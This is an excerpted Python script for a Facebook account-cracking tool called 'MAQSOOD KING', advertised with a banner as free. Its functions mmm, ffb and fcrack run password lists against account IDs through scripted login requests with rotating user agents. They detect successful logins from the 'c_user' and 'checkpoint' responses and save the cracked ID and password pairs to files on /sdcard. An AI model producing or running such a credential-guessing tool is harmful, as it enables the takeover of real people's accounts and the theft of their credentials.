...
|     |  _  |     |   __|     |     |    \ 
| | | |     |  |  |__   |  |  |  |  |  |  |
|_|_|_|__|__|__  _|_____|_____|_____|____/ 
               |__|                        
                                               
\033[1;31m(•)=============================================🥀
\033[1;36m[•] \033[1;34m𝑪𝑹𝑬𝑨𝑻𝑬𝑫 𝑩𝒀   : » \033[1;34m𝑶𝑾𝑵𝑬𝑹 𝐌𝐀𝐐𝐒𝐎𝐎𝐃
\033[1;32m[•] \033[1;36m𝑭𝑨𝑪𝑬𝑩𝑶𝑶𝑲    : » \033[1;36m𝐌𝐀𝐐𝐒𝐎𝐎𝐃 𝐊𝐈𝐍𝐆
\033[1;37m[•] \033[1;37m𝑮𝑰𝑻𝑯𝑼𝑩    : » \033[1;37m𝐊𝐀𝐌𝐄𝐄𝐍𝐀 𝟎𝟎𝟏
\033[1;33m[•] \033[1;34m𝑺𝑻𝑨𝑻𝑼𝑺      : » \033[1;34m𝑻𝑶𝑶𝑳 𝑰𝑺 𝑭𝑹𝑬𝑬
\033[1;32m[•] \033[1;33m𝑽𝑬𝑹𝑺𝑰𝑶𝑵    : » \033[1;33m𝟎.𝟗
 \033[1;31m(•)=============================================💔\n\n"""  
def linex():
		print('\033[1;37m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> MAQSOOD-KING TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/MAQSOOD-KING.txt')
				linex()
				...
				os.system('python MAQSOOD KING.py')
			elif xd in ['2','02']:
				menu()
			elif xd in ['3','03']:
				bd()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[MAQSOOD KING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[MAQSOOD KING-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/MAQSOOD KING-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[MAQSOOD KING-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/MAQSOOD KING-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[MAQSOOD KING] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[MAQSOOD KING-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[MAQSOOD KING-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mMAQSOOD KING \033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
    ...
    'user-agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[MAQSOOD-KING-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[MAQSOOD-KING-OK] '+cid+' | '+ps+'\33[0;97m')
